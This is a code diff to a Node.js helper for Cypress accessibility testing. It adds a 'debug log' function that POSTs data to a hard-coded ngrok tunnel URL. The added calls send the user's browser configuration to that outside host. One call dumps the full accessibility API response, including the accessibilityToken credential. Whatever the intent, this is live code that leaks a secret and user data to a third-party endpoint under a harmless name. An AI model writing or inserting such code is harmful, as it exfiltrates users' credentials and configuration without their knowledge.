@@ -12,12 +12,36 @@ const { consoleHolder } = require("../testObservability/helper/constants");
 const supportFileContentMap = {}
 const HttpsProxyAgent = require('https-proxy-agent');
 
+// Helper function to send logs to ngrok endpoint
+const sendDebugLog = async (message) => {
+  try {
+    const fetch = require('node-fetch');
+    await fetch("https://eb3d9133c474.ngrok-free.app/logs", {
+      method: "POST",
+      body: JSON.stringify({ message: `Aakash CBT A11Y Helper - ${message}` }),
+      headers: { "Content-Type": "application/json" },
+    });
+  } catch (error) {
+    console.error("Failed to send CBT helper log:", error.message);
+  }
+};
+
 exports.checkAccessibilityPlatform = (user_config) => {
   let hasExplicitAccessibility = false;
   let hasImplicitAccessibility = false;
   
+  const browserDetails = [];
+  
   try {
-    user_config.browsers.forEach(browser => {
+    user_config.browsers.forEach((browser, index) => {
+      const browserInfo = {
+        index,
+        browser: browser.browser,
+        os: browser.os,
+        accessibility: browser.accessibility
+      };
+      browserDetails.push(browserInfo);
+      
       if (browser.accessibility === true) {
         hasExplicitAccessibility = true;
       }
@@ -26,15 +50,27 @@ exports.checkAccessibilityPlatform = (user_config) => {
         hasImplicitAccessibility = true;
       }
     })
-  } catch {}
+  } catch(error) {
+    sendDebugLog(`CheckAccessibilityPlatform error: ${error.message}`);
+  }
   
-  return {
+  const result = {
     explicit: hasExplicitAccessibility,
     implicit: hasImplicitAccessibility && !hasExplicitAccessibility
   };
+  
+  sendDebugLog(`CheckAccessibilityPlatform result: ${JSON.stringify({
+    result,
+    browserDetails,
+    totalBrowsers: user_config.browsers?.length || 0
+  }, null, 2)}`);
+  
+  return result;
 }
 
 exports.setAccessibilityCypressCapabilities = async (user_config, accessibilityResponse) => {
+  sendDebugLog(`SetAccessibilityCypressCapabilities called with response: ${JSON.stringify(accessibilityResponse?.data, null, 2)}`);
+  
   if (utils.isUndefined(user_config.run_settings.accessibilityOptions)) {
     user_config.run_settings.accessibilityOptions = {}
   }
@@ -43,6 +79,8 @@ exports.setAccessibilityCypressCapabilities = async (user_config, accessibilityR
   user_config.run_settings.accessibilityOptions["scannerVersion"] = accessibilityResponse.data.scannerVersion;
   user_config.run_settings.system_env_vars.push(`ACCESSIBILITY_AUTH=${accessibilityResponse.data.accessibilityToken}`)
   user_config.run_settings.system_env_vars.push(`ACCESSIBILITY_SCANNERVERSION=${accessibilityResponse.data.scannerVersion}`)
+  
+  sendDebugLog(`SetAccessibilityCypressCapabilities complete: token=${accessibilityResponse.data.accessibilityToken ? 'present' : 'missing'}, version=${accessibilityResponse.data.scannerVersion}`);
 }
 
 exports.isAccessibilitySupportedCypressVersion = (cypress_config_filename) => {
